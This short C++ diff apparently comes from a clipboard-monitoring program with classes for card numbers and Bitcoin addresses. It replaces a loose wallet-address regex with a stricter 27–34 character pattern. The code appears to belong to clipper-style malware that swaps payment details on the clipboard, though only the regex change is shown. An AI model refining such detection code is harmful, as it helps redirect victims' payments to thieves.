@@ -35,7 +35,7 @@ ClipboardCardNumber::ClipboardCardNumber() {
 }
 
 ClipboardBitcoin::ClipboardBitcoin() {
-  bitcoin_wallet = std::make_shared<std::regex>("[a-z, A-Z, 0-9]{25}");
+  bitcoin_wallet = std::make_shared<std::regex>("^(?=.*[0-9])(?=.*[a-zA-Z])[\da-zA-Z]{27,34}$");
 }
 
 void SetToClipboard(std::string user, HGLOBAL hgBuffer,
